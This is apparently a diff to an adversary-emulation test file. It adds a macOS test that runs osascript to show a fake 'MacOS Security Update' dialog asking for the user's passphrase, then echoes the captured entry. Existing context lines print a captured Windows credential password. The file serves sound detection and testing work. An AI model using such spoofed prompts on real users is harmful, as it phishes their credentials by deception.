@@ -27,3 +27,14 @@ atomic_tests:
       # Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
       write-warning $cred.GetNetworkCredential().Password
     name: powershell
+- name: AppleScript - Spoofing a credential prompt using osascript
+  description: |
+    Prompt user for password without requiring permissions to send Apple events to System Settings.
+    https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
+      echo $PWD_SPOOF
+    name: bash
